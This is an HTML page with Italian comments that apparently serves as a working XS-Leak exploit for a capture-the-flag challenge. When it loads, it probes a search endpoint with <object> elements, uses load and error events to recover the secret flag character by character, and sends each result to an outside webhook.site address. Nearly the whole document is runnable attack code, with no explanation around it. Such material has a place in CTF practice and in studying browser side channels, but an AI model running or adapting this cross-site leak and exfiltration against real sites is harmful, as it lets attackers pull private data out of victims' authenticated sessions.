<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Brute Force Test</title>
</head>
<body>
    <div id="result">In attesa di risultati...</div>

    <script>
        const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"; // Set di caratteri da testare
        const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
        const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Modifica con il tuo webhook
        
        // Funzione di leak con timeout
        const leak = async (url, timeout = 3000) => {
            return new Promise((resolve) => {
                const s = document.createElement('object');
                s.data = url;

                const timer = setTimeout(() => {
                    s.remove();
                    resolve('Timeout');
                }, timeout);

                s.onload = () => {
                    clearTimeout(timer);
                    s.remove();
                    resolve('Risorsa accessibile (status 200)');
                };

                s.onerror = () => {
                    clearTimeout(timer);
                    s.remove();
                    resolve('Risorsa non accessibile (status 404 o errore)');
                };

                document.body.appendChild(s);
            });
        };

        // Funzione per eseguire il brute-force su una certa posizione della flag con delay
        const bruteForceFlag = async (currentFlag) => {
            const resultDiv = document.getElementById('result');

            for (let char of characters) {
                const testFlag = currentFlag + char;
                const url = baseUrl + encodeURIComponent(testFlag);
                const result = await leak(url);

                if (result === 'Risorsa accessibile (status 200)') {
                    resultDiv.textContent = `Carattere trovato: ${testFlag}`;
                    logResult(`Carattere trovato: ${testFlag}`);
                    
                    // Aspetta un delay e poi continua con la prossima posizione
                    await delay(500); // Delay di 500 ms
                    return bruteForceFlag(testFlag);
                }

                // Delay tra un tentativo e l'altro
                await delay(500);
            }
            resultDiv.textContent = "Tentativi esauriti senza successo.";
            logResult("Tentativi esauriti senza successo.");
        };

        // Funzione per inviare i log
        const logResult = async (message) => {
            try {
                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                const response = await fetch(urlWithParams);
                if (!response.ok) console.error('Errore invio log:', response.statusText);
            } catch (error) {
                console.error('Errore di rete:', error);
            }
        };

        // Funzione per il delay
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        // Esegui il brute-force al caricamento del DOM partendo da 'flag{'
        document.addEventListener('DOMContentLoaded', () => bruteForceFlag("flag{"));
    </script>
</body>
</html>
